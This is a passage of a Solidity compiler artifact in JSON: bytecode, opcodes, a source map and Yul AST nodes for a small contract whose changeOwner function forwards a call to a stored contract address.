                  "contents": "{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n}\n",
                  "id": 4,
                  "language": "Yul",
                  "name": "#utility.yul"
                }
              ],
              "linkReferences": {},
              "object": "608060405234801561001057600080fd5b5060405161040138038061040183398181016040528101906100329190610174565b6100647ff22777cb04e164fba43d347a64d9272fcffd311fe04f1ef3f11fd4d4711c9cb360001b61010e60201b60201c565b6100967f3faaece4464d838dc629a772bc2fe00594b885c5dbccab741e9755d8beb8c2b860001b61010e60201b60201c565b6100c87f1905a7ea1b914ad8023df509e74dbe3df1dc9375a2fac14bcdcb55eda50eefb360001b61010e60201b60201c565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506101a1565b50565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061014182610116565b9050919050565b61015181610136565b811461015c57600080fd5b50565b60008151905061016e81610148565b92915050565b60006020828403121561018a57610189610111565b5b60006101988482850161015f565b91505092915050565b610251806101b06000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063a6f9dae114610030575b600080fd5b61004a600480360381019061004591906101c4565b61004c565b005b6100787f95ddb175a1fdc37c4399f4d8e36ff5783af8bae0c041fc49d1707d6fab60ed1860001b61015e565b6100a47fa4d14fb052b99e90be993b3e9692be1f0ee653e938c08ccda4f1cf48bda729a360001b61015e565b6100d07f336c7e84867c4841e1137bec080607d657aad78e0f123e2d8e7d6c01479d129560001b61015e565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6f9dae1826040518263ffffffff1660e01b81526004016101299190610200565b600060405180830381600087803b15801561014357600080fd5b505af1158015610157573d6000803e3d6000fd5b5050505050565b50565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061019182610166565b9050919050565b6101a181610186565b81146101ac57600080fd5b50565b6000813590506101be81610198565b92915050565b6000602082840312156101da576101d9610161565b5b60006101e8848285016101af565b91505092915050565b6101fa81610186565b82525050565b600060208201905061021560008301846101f1565b9291505056fea2646970667358221220362fb8974b07651a92985b1a5315072c8858456be27f704a60597b697d538cdb64736f6c634300080a0033",
              "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x401 CODESIZE SUB DUP1 PUSH2 0x401 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0x174 JUMP JUMPDEST PUSH2 0x64 PUSH32 0xF22777CB04E164FBA43D347A64D9272FCFFD311FE04F1EF3F11FD4D4711C9CB3 PUSH1 0x0 SHL PUSH2 0x10E PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH2 0x96 PUSH32 0x3FAAECE4464D838DC629A772BC2FE00594B885C5DBCCAB741E9755D8BEB8C2B8 PUSH1 0x0 SHL PUSH2 0x10E PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH2 0xC8 PUSH32 0x1905A7EA1B914AD8023DF509E74DBE3DF1DC9375A2FAC14BCDCB55EDA50EEFB3 PUSH1 0x0 SHL PUSH2 0x10E PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x1A1 JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x141 DUP3 PUSH2 0x116 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x151 DUP2 PUSH2 0x136 JUMP JUMPDEST DUP2 EQ PUSH2 0x15C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x16E DUP2 PUSH2 0x148 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x18A JUMPI PUSH2 0x189 PUSH2 0x111 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x198 DUP5 DUP3 DUP6 ADD PUSH2 0x15F JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x251 DUP1 PUSH2 0x1B0 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xA6F9DAE1 EQ PUSH2 0x30 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4A PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x45 SWAP2 SWAP1 PUSH2 0x1C4 JUMP JUMPDEST PUSH2 0x4C JUMP JUMPDEST STOP JUMPDEST PUSH2 0x78 PUSH32 0x95DDB175A1FDC37C4399F4D8E36FF5783AF8BAE0C041FC49D1707D6FAB60ED18 PUSH1 0x0 SHL PUSH2 0x15E JUMP JUMPDEST PUSH2 0xA4 PUSH32 0xA4D14FB052B99E90BE993B3E9692BE1F0EE653E938C08CCDA4F1CF48BDA729A3 PUSH1 0x0 SHL PUSH2 0x15E JUMP JUMPDEST PUSH2 0xD0 PUSH32 0x336C7E84867C4841E1137BEC080607D657AAD78E0F123E2D8E7D6C01479D1295 PUSH1 0x0 SHL PUSH2 0x15E JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA6F9DAE1 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x129 SWAP2 SWAP1 PUSH2 0x200 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x143 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x157 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x191 DUP3 PUSH2 0x166 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1A1 DUP2 PUSH2 0x186 JUMP JUMPDEST DUP2 EQ PUSH2 0x1AC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x1BE DUP2 PUSH2 0x198 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x1DA JUMPI PUSH2 0x1D9 PUSH2 0x161 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x1E8 DUP5 DUP3 DUP6 ADD PUSH2 0x1AF JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x1FA DUP2 PUSH2 0x186 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x215 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1F1 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CALLDATASIZE 0x2F 0xB8 SWAP8 0x4B SMOD PUSH6 0x1A92985B1A53 ISZERO SMOD 0x2C DUP9 PC GASLIMIT PUSH12 0xE27F704A60597B697D538CDB PUSH5 0x736F6C6343 STOP ADDMOD EXP STOP CALLER ",
              "sourceMap": "581:935:2:-:0;;;702:371;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;733:80;746:66;733:80;;:12;;;:80;;:::i;:::-;833;846:66;833:80;;:12;;;:80;;:::i;:::-;935;948:66;935:80;;:12;;;:80;;:::i;:::-;1056:8;1034:9;;:31;;;;;;;;;;;;;;;;;;702:371;581:935;;606:61;;:::o;88:117:4:-;197:1;194;187:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:96::-;503:7;532:24;550:5;532:24;:::i;:::-;521:35;;466:96;;;:::o;568:122::-;641:24;659:5;641:24;:::i;:::-;634:5;631:35;621:63;;680:1;677;670:12;621:63;568:122;:::o;696:143::-;753:5;784:6;778:13;769:22;;800:33;827:5;800:33;:::i;:::-;696:143;;;;:::o;845:351::-;915:6;964:2;952:9;943:7;939:23;935:32;932:119;;;970:79;;:::i;:::-;932:119;1090:1;1115:64;1171:7;1162:6;1151:9;1147:22;1115:64;:::i;:::-;1105:74;;1061:128;845:351;;;;:::o;581:935:2:-;;;;;;;"
            },
            "deployedBytecode": {
              "functionDebugData": {
                "@c_0x57d152bd_191": {
                  "entryPoint": 350,
                  "id": 191,
                  "parameterSlots": 1,
                  "returnSlots": 0
                },
                "@changeOwner_243": {
                  "entryPoint": 76,
                  "id": 243,
                  "parameterSlots": 1,
                  "returnSlots": 0
                },
                "abi_decode_t_address": {
                  "entryPoint": 431,
                  "id": null,
                  "parameterSlots": 2,
                  "returnSlots": 1
                },
                "abi_decode_tuple_t_address": {
                  "entryPoint": 452,
                  "id": null,
                  "parameterSlots": 2,
                  "returnSlots": 1
                },
                "abi_encode_t_address_to_t_address_fromStack": {
                  "entryPoint": 497,
                  "id": null,
                  "parameterSlots": 2,
                  "returnSlots": 0
                },
                "abi_encode_tuple_t_address__to_t_address__fromStack_reversed": {
                  "entryPoint": 512,
                  "id": null,
                  "parameterSlots": 2,
                  "returnSlots": 1
                },
                "allocate_unbounded": {
                  "entryPoint": null,
                  "id": null,
                  "parameterSlots": 0,
                  "returnSlots": 1
                },
                "cleanup_t_address": {
                  "entryPoint": 390,
                  "id": null,
                  "parameterSlots": 1,
                  "returnSlots": 1
                },
                "cleanup_t_uint160": {
                  "entryPoint": 358,
                  "id": null,
                  "parameterSlots": 1,
                  "returnSlots": 1
                },
                "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
                  "entryPoint": null,
                  "id": null,
                  "parameterSlots": 0,
                  "returnSlots": 0
                },
                "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
                  "entryPoint": 353,
                  "id": null,
                  "parameterSlots": 0,
                  "returnSlots": 0
                },
                "validator_revert_t_address": {
                  "entryPoint": 408,
                  "id": null,
                  "parameterSlots": 1,
                  "returnSlots": 0
                }
              },
              "generatedSources": [
                {
                  "ast": {
                    "nodeType": "YulBlock",
                    "src": "0:1525:4",
                    "statements": [
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "47:35:4",
                          "statements": [
                            {
                              "nodeType": "YulAssignment",
                              "src": "57:19:4",
                              "value": {
                                "arguments": [
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "73:2:4",
                                    "type": "",
                                    "value": "64"
                                  }
                                ],
                                "functionName": {
                                  "name": "mload",
                                  "nodeType": "YulIdentifier",
                                  "src": "67:5:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "67:9:4"
                              },
                              "variableNames": [
                                {
                                  "name": "memPtr",
                                  "nodeType": "YulIdentifier",
                                  "src": "57:6:4"
                                }
                              ]
                            }
                          ]
                        },
                        "name": "allocate_unbounded",
                        "nodeType": "YulFunctionDefinition",
                        "returnVariables": [
                          {
                            "name": "memPtr",
                            "nodeType": "YulTypedName",
                            "src": "40:6:4",
                            "type": ""
                          }
                        ],
                        "src": "7:75:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "177:28:4",
                          "statements": [
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "194:1:4",
                                    "type": "",
                                    "value": "0"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "197:1:4",
                                    "type": "",
                                    "value": "0"
                                  }
                                ],
                                "functionName": {
                                  "name": "revert",
                                  "nodeType": "YulIdentifier",
                                  "src": "187:6:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "187:12:4"
                              },
                              "nodeType": "YulExpressionStatement",
                              "src": "187:12:4"
                            }
                          ]
                        },
                        "name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
                        "nodeType": "YulFunctionDefinition",
                        "src": "88:117:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "300:28:4",
                          "statements": [
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "317:1:4",
                                    "type": "",
                                    "value": "0"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "320:1:4",
                                    "type": "",
                                    "value": "0"
                                  }
                                ],
                                "functionName": {
                                  "name": "revert",
                                  "nodeType": "YulIdentifier",
                                  "src": "310:6:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "310:12:4"
                              },
                              "nodeType": "YulExpressionStatement",
                              "src": "310:12:4"
                            }
                          ]
                        },
                        "name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
                        "nodeType": "YulFunctionDefinition",
                        "src": "211:117:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "379:81:4",
                          "statements": [
                            {
                              "nodeType": "YulAssignment",
                              "src": "389:65:4",
                              "value": {
                                "arguments": [
                                  {
                                    "name": "value",
                                    "nodeType": "YulIdentifier",
                                    "src": "404:5:4"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "411:42:4",
                                    "type": "",
                                    "value": "0xffffffffffffffffffffffffffffffffffffffff"
                                  }
                                ],
                                "functionName": {
                                  "name": "and",
                                  "nodeType": "YulIdentifier",
                                  "src": "400:3:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "400:54:4"
                              },
                              "variableNames": [
                                {
                                  "name": "cleaned",
                                  "nodeType": "YulIdentifier",
                                  "src": "389:7:4"
                                }
                              ]
                            }
                          ]
                        },
                        "name": "cleanup_t_uint160",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "value",
                            "nodeType": "YulTypedName",
                            "src": "361:5:4",
                            "type": ""
                          }
                        ],
                        "returnVariables": [
                          {
                            "name": "cleaned",
                            "nodeType": "YulTypedName",
                            "src": "371:7:4",
                            "type": ""
                          }
                        ],
                        "src": "334:126:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "511:51:4",
                          "statements": [
                            {
                              "nodeType": "YulAssignment",
                              "src": "521:35:4",
                              "value": {
                                "arguments": [
                                  {
                                    "name": "value",
                                    "nodeType": "YulIdentifier",
                                    "src": "550:5:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "cleanup_t_uint160",
                                  "nodeType": "YulIdentifier",
                                  "src": "532:17:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "532:24:4"
                              },
                              "variableNames": [
                                {
                                  "name": "cleaned",
                                  "nodeType": "YulIdentifier",
                                  "src": "521:7:4"
                                }
                              ]
                            }
                          ]
                        },
                        "name": "cleanup_t_address",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "value",
                            "nodeType": "YulTypedName",
                            "src": "493:5:4",
                            "type": ""
                          }
                        ],
                        "returnVariables": [
                          {
                            "name": "cleaned",
                            "nodeType": "YulTypedName",
                            "src": "503:7:4",
                            "type": ""
                          }
                        ],
                        "src": "466:96:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "611:79:4",
                          "statements": [
                            {
                              "body": {
                                "nodeType": "YulBlock",
                                "src": "668:16:4",
                                "statements": [
                                  {
                                    "expression": {
                                      "arguments": [
                                        {
                                          "kind": "number",
                                          "nodeType": "YulLiteral",
                                          "src": "677:1:4",
                                          "type": "",
                                          "value": "0"
                                        },
                                        {
                                          "kind": "number",
                                          "nodeType": "YulLiteral",
                                          "src": "680:1:4",
                                          "type": "",
                                          "value": "0"
                                        }
                                      ],
                                      "functionName": {
                                        "name": "revert",
                                        "nodeType": "YulIdentifier",
                                        "src": "670:6:4"
                                      },
                                      "nodeType": "YulFunctionCall",
                                      "src": "670:12:4"
                                    },
                                    "nodeType": "YulExpressionStatement",
                                    "src": "670:12:4"
                                  }
                                ]
                              },
                              "condition": {
                                "arguments": [
                                  {
                                    "arguments": [
                                      {
                                        "name": "value",
                                        "nodeType": "YulIdentifier",
                                        "src": "634:5:4"
                                      },
                                      {
                                        "arguments": [
                                          {
                                            "name": "value",
                                            "nodeType": "YulIdentifier",
                                            "src": "659:5:4"
                                          }
                                        ],
                                        "functionName": {
                                          "name": "cleanup_t_address",
                                          "nodeType": "YulIdentifier",
                                          "src": "641:17:4"
                                        },
                                        "nodeType": "YulFunctionCall",
                                        "src": "641:24:4"
                                      }
                                    ],
                                    "functionName": {
                                      "name": "eq",
                                      "nodeType": "YulIdentifier",
                                      "src": "631:2:4"
                                    },
                                    "nodeType": "YulFunctionCall",
                                    "src": "631:35:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "iszero",
                                  "nodeType": "YulIdentifier",
                                  "src": "624:6:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "624:43:4"
                              },
                              "nodeType": "YulIf",
                              "src": "621:63:4"
                            }
                          ]
                        },
                        "name": "validator_revert_t_address",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "value",
                            "nodeType": "YulTypedName",
                            "src": "604:5:4",
                            "type": ""
                          }
                        ],
                        "src": "568:122:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "748:87:4",
                          "statements": [
                            {
                              "nodeType": "YulAssignment",
                              "src": "758:29:4",
                              "value": {
                                "arguments": [
                                  {
                                    "name": "offset",
                                    "nodeType": "YulIdentifier",
                                    "src": "780:6:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "calldataload",
                                  "nodeType": "YulIdentifier",
                                  "src": "767:12:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "767:20:4"
                              },
                              "variableNames": [
                                {
                                  "name": "value",
                                  "nodeType": "YulIdentifier",
                                  "src": "758:5:4"
                                }
                              ]
                            },
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "name": "value",
                                    "nodeType": "YulIdentifier",
                                    "src": "823:5:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "validator_revert_t_address",
                                  "nodeType": "YulIdentifier",
                                  "src": "796:26:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "796:33:4"
                              },
                              "nodeType": "YulExpressionStatement",
                              "src": "796:33:4"
                            }
                          ]
                        },
                        "name": "abi_decode_t_address",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "offset",
                            "nodeType": "YulTypedName",
                            "src": "726:6:4",
                            "type": ""
                          },
                          {
                            "name": "end",
                            "nodeType": "YulTypedName",
                            "src": "734:3:4",
                            "type": ""
                          }
                        ],
                        "returnVariables": [
                          {
                            "name": "value",
                            "nodeType": "YulTypedName",
                            "src": "742:5:4",
                            "type": ""
                          }
                        ],
                        "src": "696:139:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "907:263:4",
                          "statements": [
                            {
                              "body": {
                                "nodeType": "YulBlock",
                                "src": "953:83:4",
                                "statements": [
                                  {
                                    "expression": {
                                      "arguments": [],
                                      "functionName": {
                                        "name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
                                        "nodeType": "YulIdentifier",
                                        "src": "955:77:4"
                                      },
                                      "nodeType": "YulFunctionCall",
                                      "src": "955:79:4"
                                    },
                                    "nodeType": "YulExpressionStatement",
                                    "src": "955:79:4"
                                  }
                                ]
                              },
                              "condition": {
                                "arguments": [
                                  {
                                    "arguments": [
                                      {
                                        "name": "dataEnd",
                                        "nodeType": "YulIdentifier",
                                        "src": "928:7:4"
                                      },
                                      {
                                        "name": "headStart",
                                        "nodeType": "YulIdentifier",
                                        "src": "937:9:4"
                                      }
                                    ],
                                    "functionName": {
                                      "name": "sub",
                                      "nodeType": "YulIdentifier",
                                      "src": "924:3:4"
                                    },
                                    "nodeType": "YulFunctionCall",
                                    "src": "924:23:4"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "949:2:4",
                                    "type": "",
                                    "value": "32"
                                  }
                                ],
                                "functionName": {
                                  "name": "slt",
                                  "nodeType": "YulIdentifier",
                                  "src": "920:3:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "920:32:4"
                              },
                              "nodeType": "YulIf",
                              "src": "917:119:4"
                            },
                            {
                              "nodeType": "YulBlock",
                              "src": "1046:117:4",
                              "statements": [
                                {
                                  "nodeType": "YulVariableDeclaration",
                                  "src": "1061:15:4",
                                  "value": {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "1075:1:4",
                                    "type": "",
                                    "value": "0"
                                  },
                                  "variables": [
                                    {
                                      "name": "offset",
                                      "nodeType": "YulTypedName",
                                      "src": "1065:6:4",
                                      "type": ""
                                    }
                                  ]
                                },
                                {
                                  "nodeType": "YulAssignment",
                                  "src": "1090:63:4",
                                  "value": {
                                    "arguments": [
                                      {
                                        "arguments": [
                                          {
                                            "name": "headStart",
                                            "nodeType": "YulIdentifier",
                                            "src": "1125:9:4"
                                          },
                                          {
                                            "name": "offset",
                                            "nodeType": "YulIdentifier",
                                            "src": "1136:6:4"
                                          }
                                        ],
                                        "functionName": {
                                          "name": "add",
                                          "nodeType": "YulIdentifier",
                                          "src": "1121:3:4"
                                        },
                                        "nodeType": "YulFunctionCall",
                                        "src": "1121:22:4"
                                      },
                                      {
                                        "name": "dataEnd",
                                        "nodeType": "YulIdentifier",
                                        "src": "1145:7:4"
                                      }
                                    ],
                                    "functionName": {
                                      "name": "abi_decode_t_address",
                                      "nodeType": "YulIdentifier",
                                      "src": "1100:20:4"
                                    },
                                    "nodeType": "YulFunctionCall",
                                    "src": "1100:53:4"
                                  },
                                  "variableNames": [
                                    {
                                      "name": "value0",
                                      "nodeType": "YulIdentifier",
                                      "src": "1090:6:4"
                                    }
                                  ]
                                }
                              ]
                            }
                          ]
                        },
                        "name": "abi_decode_tuple_t_address",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "headStart",
                            "nodeType": "YulTypedName",
                            "src": "877:9:4",
                            "type": ""
                          },
                          {
                            "name": "dataEnd",
                            "nodeType": "YulTypedName",
                            "src": "888:7:4",
                            "type": ""
                          }
                        ],
                        "returnVariables": [
                          {
                            "name": "value0",
                            "nodeType": "YulTypedName",
                            "src": "900:6:4",
                            "type": ""
                          }
                        ],
                        "src": "841:329:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "1241:53:4",
                          "statements": [
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "name": "pos",
                                    "nodeType": "YulIdentifier",
                                    "src": "1258:3:4"
                                  },
                                  {
                                    "arguments": [
                                      {
                                        "name": "value",
                                        "nodeType": "YulIdentifier",
                                        "src": "1281:5:4"
                                      }
                                    ],
                                    "functionName": {
                                      "name": "cleanup_t_address",
                                      "nodeType": "YulIdentifier",
                                      "src": "1263:17:4"
                                    },
                                    "nodeType": "YulFunctionCall",
                                    "src": "1263:24:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "mstore",
                                  "nodeType": "YulIdentifier",
                                  "src": "1251:6:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "1251:37:4"
                              },
                              "nodeType": "YulExpressionStatement",
                              "src": "1251:37:4"
                            }
                          ]
                        },
                        "name": "abi_encode_t_address_to_t_address_fromStack",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "value",
                            "nodeType": "YulTypedName",
                            "src": "1229:5:4",
                            "type": ""
                          },
                          {
                            "name": "pos",
                            "nodeType": "YulTypedName",
                            "src": "1236:3:4",
                            "type": ""
                          }
                        ],
                        "src": "1176:118:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "1398:124:4",
                          "statements": [
                            {
                              "nodeType": "YulAssignment",
                              "src": "1408:26:4",
                              "value": {
                                "arguments": [
                                  {
                                    "name": "headStart",
                                    "nodeType": "YulIdentifier",
                                    "src": "1420:9:4"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "1431:2:4",
                                    "type": "",
                                    "value": "32"
                                  }
                                ],
                                "functionName": {
                                  "name": "add",
                                  "nodeType": "YulIdentifier",
                                  "src": "1416:3:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "1416:18:4"
                              },
                              "variableNames": [
                                {
                                  "name": "tail",
                                  "nodeType": "YulIdentifier",
                                  "src": "1408:4:4"
                                }
                              ]
                            },
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "name": "value0",
                                    "nodeType": "YulIdentifier",
                                    "src": "1488:6:4"
                                  },
                                  {
                                    "arguments": [
                                      {
                                        "name": "headStart",
                                        "nodeType": "YulIdentifier",
                                        "src": "1501:9:4"
                                      },
                                      {
                                        "kind": "number",
                                        "nodeType": "YulLiteral",
                                        "src": "1512:1:4",
                                        "type": "",
                                        "value": "0"
                                      }
                                    ],
                                    "functionName": {
                                      "name": "add",
                                      "nodeType": "YulIdentifier",
                                      "src": "1497:3:4"
                                    },
                                    "nodeType": "YulFunctionCall",
                                    "src": "1497:17:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "abi_encode_t_address_to_t_address_fromStack",
                                  "nodeType": "YulIdentifier",
                                  "src": "1444:43:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "1444:71:4"
                              },
                              "nodeType": "YulExpressionStatement",
                              "src": "1444:71:4"
                            }
                          ]
                        },
                        "name": "abi_encode_tuple_t_address__to_t_address__fromStack_reversed",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "headStart",
                            "nodeType": "YulTypedName",
                            "src": "1370:9:4",
                            "type": ""
                          },
                          {
                            "name": "value0",
                            "nodeType": "YulTypedName",
                            "src": "1382:6:4",
                            "type": ""
                          }
                        ],
                        "returnVariables": [
                          {
                            "name": "tail",
                            "nodeType": "YulTypedName",
                            "src": "1393:4:4",
                            "type": ""
                          }
                        ],
                        "src": "1300:222:4"
                      }
                    ]
                  },
